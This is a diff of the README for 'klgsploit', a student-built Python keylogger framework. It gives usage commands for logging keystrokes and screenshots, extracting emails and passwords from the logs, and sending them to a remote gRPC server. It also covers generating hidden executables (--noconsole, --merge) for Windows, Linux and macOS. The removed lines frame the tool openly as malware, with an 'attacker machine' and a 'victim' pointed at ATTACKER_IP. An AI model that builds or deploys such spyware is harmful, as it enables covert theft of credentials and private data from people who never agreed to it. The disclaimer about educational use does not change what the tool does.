@@ -1,23 +1,33 @@
 # keylogger-advprog
-a keylogger programmed using python and some advanced tools
 
-## what is this project a summary 
-this is like swiss army knife for keylogging attack we made this repo as all in one tool that have all those functionalities 
-- keylogging
-- saving key with window informations into txt file
-- screenshot current window
-- send data to grpc server and execute action accordingly server side (classification in this case you can change the action in python scrip and rebuild the executable)
-- specify executable malware options and generate it accordingly
-- cross platform malware
-- the executablefor linux is in the build folder
+A keylogger implemented in Python using advanced tools and architectural patterns.
 
-### first we need to install dependencies
+## Project Summary
+
+This project was designed as an all-in-one keylogging framework, similar in spirit to a modular multi-tool. The repository integrates multiple functionalities:
+
+- Keylogging
+- Saving captured keystrokes with window information into a text file
+- Screenshot capture of the active window
+- gRPC communication for remote data transmission and server-side actions
+- Executable generation with configurable options
+- Cross-platform support
+- Prebuilt Linux executables available in the `build` folder
+
+An **Observer Design Pattern** was implemented within the classifier module to trigger notifications when sensitive data (emails, passwords, etc.) is detected.
+
+---
+
+## Installing Dependencies
+
 ```bash
 python3 -m venv venv
-source venv/bin/activate
+source venv/bin/activate          # On Windows: venv\Scripts\activate
+pip install pynput pillow mss python-xlib grpcio grpcio-tools pyinstaller ttkbootstrap
 ```
 
-### all python dependencies we use
+Or install packages individually:
+
 ```bash
 pip install pynput
 pip install pillow
@@ -29,251 +39,262 @@ pip install pyinstaller
 pip install ttkbootstrap
 ```
 
-or just run this one liner
-```bash
-pip install pynput pillow mss python-xlib grpcio grpcio-tools pyinstaller ttkbootstrap
-```
+---
 
-## project structure explained
+## Project Structure
+
 ```
 keylogger-advprog/
-├── assembled/              # main source code folder
-│   ├── klgsploit_cli.py    # cli version of the tool
-│   ├── klgsploit_gui.py    # gui version with tabs and buttons
-│   ├── keylogtest.py       # linux keylogger module
-│   ├── keylogwin.py        # windows keylogger module
-│   ├── capture.py          # screenshot capture module
-│   ├── classifier.py       # email and password extractor
-│   ├── grpcsrv.py          # grpc server to receive keylogs
-│   ├── cln.py              # grpc client module
-│   └── protos/             # protobuf files for grpc
+├── restructured/               # Main source code
+│   ├── klgsploit_cli.py        # CLI version
+│   ├── klgsploit_gui.py        # GUI version
+│   ├── keylogtest.py           # Linux keylogger module
+│   ├── keylogwin.py            # Windows keylogger module
+│   ├── capture.py              # Screenshot module
+│   ├── classifier.py           # Email/password extractor + AI logic
+│   ├── grpcsrv.py              # gRPC server
+│   ├── cln.py                  # gRPC client
+│   └── protos/                 # Protobuf definitions
 │       ├── server.proto
 │       ├── server_pb2.py
 │       └── server_pb2_grpc.py
-├── build/                  # compiled executables go here
-│   ├── klgsploit_cli       # linux cli executable
-│   └── klgsploit_gui       # linux gui executable
-├── classifier.py           # standalone classifier script
-├── keylog.txt              # output file for captured keys
-└── README.md               # you are reading this
+├── build/                      # Compiled executables
+│   ├── klgsploit_cli
+│   └── klgsploit_gui
+├── classifier.py               # Standalone classifier
+├── keylog.txt                  # Output log file
+└── README.md
 ```
 
-## how to use klgsploit cli version
-the cli tool is the main thing here it does everything from keylogging to generating executables
+---
 
-### run keylogger directly
+## CLI Usage
+
+Navigate to the source folder:
+
 ```bash
-cd assembled
+cd restructured
+```
+
+Run keylogger:
+
+```bash
 python3 klgsploit_cli.py --run
 ```
 
-### run with timestamps and window titles
+Run with timestamps and window titles:
+
 ```bash
 python3 klgsploit_cli.py --run -t -m
 ```
 
-### run with screenshots every 30 seconds
+Run with screenshots:
+
 ```bash
 python3 klgsploit_cli.py --run -s -i 30
 ```
 
-### generate executable for linux
+Generate Linux executable:
+
 ```bash
 python3 klgsploit_cli.py --genexe mylogger -lnx
 ```
 
-### generate executable for windows
+Generate Windows executable:
+
 ```bash
 python3 klgsploit_cli.py --genexe mylogger -win
 ```
 
-### generate with all features enabled
+Generate with all features:
+
 ```bash
 python3 klgsploit_cli.py --genexe superlogger -lnx -t -m -s
 ```
 
-### classify emails and passwords from log file
+Classify log file:
+
 ```bash
 python3 klgsploit_cli.py --classify keylog.txt
 ```
 
-### start grpc server to receive remote keylogs
+Start gRPC server:
+
 ```bash
 python3 klgsploit_cli.py --server --grpc-port 50051
 ```
 
-### run keylogger with grpc remote logging
+Run with remote logging:
+
 ```bash
 python3 klgsploit_cli.py --run --grpc 192.168.1.100:50051
 ```
 
-## cli options reference
-| option | what it does |
-|--------|--------------|
-| `--run` | run keylogger directly |
-| `--genexe NAME` | generate executable with pyinstaller |
-| `-t` | enable timestamps |
-| `-m` | log window titles |
-| `-s` | enable screenshots |
-| `-i SECONDS` | screenshot interval |
-| `-o FILE` | output log file |
-| `-win` | target windows |
-| `-lnx` | target linux |
-| `-mac` | target macos |
-| `--grpc HOST:PORT` | send logs to grpc server |
-| `--server` | start grpc server mode |
-| `--classify FILE` | extract emails passwords from log |
-| `--merge EXE1 EXE2` | merge two executables |
-| `--noconsole` | hide console window |
-| `--onefile` | single file executable |
+---
 
-## how to use klgsploit gui version
-if you prefer clicking buttons over typing commands use the gui version
+## CLI Options Reference
+
+| Option | Description |
+|--------|-------------|
+| `--run` | Run keylogger |
+| `--genexe NAME` | Generate executable |
+| `-t` | Enable timestamps |
+| `-m` | Log window titles |
+| `-s` | Enable screenshots |
+| `-i SECONDS` | Screenshot interval |
+| `-o FILE` | Output file |
+| `-win` | Target Windows |
+| `-lnx` | Target Linux |
+| `-mac` | Target macOS |
+| `--grpc HOST:PORT` | Send logs via gRPC |
+| `--server` | Start gRPC server |
+| `--classify FILE` | Extract sensitive data |
+| `--merge EXE1 EXE2` | Merge executables |
+| `--noconsole` | Hide console |
+| `--onefile` | Single file executable |
+
+---
+
+## GUI Usage
 
 ```bash
-cd assembled
+cd restructured
 python3 klgsploit_gui.py
 ```
 
-it has 6 tabs
-- **keylogger** - start stop keylogger configure options
-- **screenshots** - manual and auto screenshot capture
-- **generate exe** - build executables with custom options
-- **classify** - extract emails passwords from logs
-- **log viewer** - view and clear keylog output
-- **grpc server** - receive remote keylogs
+GUI Features:
 
-## using the prebuilt executables
-we already compiled linux executables in the build folder just run them
+- Keylogger configuration
+- Screenshot controls
+- Executable generation
+- Log classification
+- Log viewer
+- gRPC server receiver
+
+---
+
+## Using Prebuilt Executables
 
 ```bash
-# cli version
 ./build/klgsploit_cli --help
-
-# gui version
 ./build/klgsploit_gui
 ```
 
-## grpc setup for remote logging
-if you want to send keylogs to remote server you need to setup grpc
+---
 
-### generate proto files
+## gRPC Setup
+
+Generate protobuf files:
+
 ```bash
-cd assembled
-python3 -m grpc_tools.protoc -I protos --python_out=protos --grpc_python_out=protos protos/server.proto
+cd restructured
+python3 -m grpc_tools.protoc -Iprotos \
+    --python_out=protos \
+    --grpc_python_out=protos \
+    protos/server.proto
 ```
 
-### fix import in server_pb2_grpc.py
-change this line
-```python
-import server_pb2 as server__pb2
-```
-to this
-```python
-from . import server_pb2 as server__pb2
-```
+Start server:
 
-### start server on attacker machine
 ```bash
 python3 klgsploit_cli.py --server --grpc-port 50051
 ```
 
-### run keylogger on victim with grpc
+Run client with remote logging:
+
 ```bash
-python3 klgsploit_cli.py --run --grpc ATTACKER_IP:50051
+python3 klgsploit_cli.py --run --grpc IP:PORT
 ```
 
-## classifier module
-the classifier extracts potential emails and passwords from keylog files using regex patterns
+---
 
-### standalone usage
+## Classifier Module
+
+The classifier extracts potential emails and passwords from logs using regular expressions.  
+Standalone usage:
+
 ```bash
 python3 classifier.py keylog.txt
 ```
 
-### output format
-it creates a json file with this structure
-```json
-{
-  "emails": [
-    {"value": "user@example.com", "count": 5}
-  ],
-  "passwords": [
-    {"value": "secretpass123", "count": 2}
-  ]
-}
-```
+Output:
 
-## cross platform support
-the tool works on linux windows and macos
+- JSON file containing detected data
+- Counts and statistics
 
-| platform | keylogger | screenshots | window titles |
-|----------|-----------|-------------|---------------|
-| linux | pynput + xlib | mss/pillow | xlib |
-| windows | pynput | pillow | ctypes |
-| macos | pynput | pillow | appkit |
+---
 
-## building executables yourself
-if you want to compile the executables yourself
+## Cross-Platform Support
 
-### build cli version
+| Platform | Keylogging | Screenshots | Window Titles |
+|----------|------------|-------------|---------------|
+| Linux | pynput + xlib | mss / pillow | xlib |
+| Windows | pynput | pillow | ctypes / pygetwindow |
+| macOS | pynput | pillow | appkit / quartz |
+
+---
+
+## Building Executables
+
+CLI version:
+
 ```bash
-cd assembled
-python3 -m PyInstaller --onefile --name klgsploit_cli --distpath ../build klgsploit_cli.py
+cd restructured
+python3 -m PyInstaller --onefile --name klgsploit_cli \
+    --distpath ../build klgsploit_cli.py
 ```
 
-### build gui version
+GUI version:
+
 ```bash
-cd assembled
-python3 -m PyInstaller --onefile --noconsole --name klgsploit_gui --distpath ../build klgsploit_gui.py
+python3 -m PyInstaller --onefile --noconsole \
+    --name klgsploit_gui --distpath ../build klgsploit_gui.py
 ```
 
-## troubleshooting common issues
+---
 
-### pynput not working on linux
-you need to be in input group or run as root
+## Troubleshooting
+
+- pynput issues on Linux:
+
 ```bash
 sudo usermod -aG input $USER
-# then logout and login again
 ```
 
-### xlib import error
-install python xlib
-```bash
-pip install python-xlib
-```
+- Missing gRPC modules:
 
-### grpc module not found
 ```bash
 pip install grpcio grpcio-tools
 ```
 
-### screenshot not working
-install pillow or mss
+- Screenshot problems:
+
 ```bash
 pip install pillow mss
 ```
 
-### tkinter not found for gui
-```bash
-# debian/ubuntu
-sudo apt install python3-tk
+- Missing tkinter:
 
-# arch
-sudo pacman -S tk
-```
+Install `python3-tk` (Debian/Ubuntu) or `tk` (Arch).
 
-## disclaimer
-this tool is for educational and authorized security testing only. using keyloggers without permission is illegal. we are not responsible for any misuse of this tool. always get proper authorization before testing on any system.
+---
 
-I AM NOT RESPONSIBLE OF MISSUSE OF THIS TOOL ME OR MY TEAM ARE DOING IT JUST FOR EDUCATIONAL PURPOSES 
+## Disclaimer
 
-## authors
-made for advanced programming course project
-- WAIL SARI BEY
-- ANES RAGOUB
-- INES ALLAG
-- AMANI SAHRAOUI
+This tool is intended strictly for educational purposes and authorized security testing.
 
-## contact us suggestions help contribution
-thank you all for contribution suggestions or whatever just contact anyone of the contributers thank you
+Unauthorized use of keylogging software is illegal.  
+The authors assume no responsibility for misuse.
+
+Always obtain proper authorization before testing any system.
+
+---
+
+## Authors
+
+Developed as part of an advanced programming course project.
+
+- Wail Sari Bey
+- Ines Allag
+- Anes Ragoub
+- Amani Sahraoui
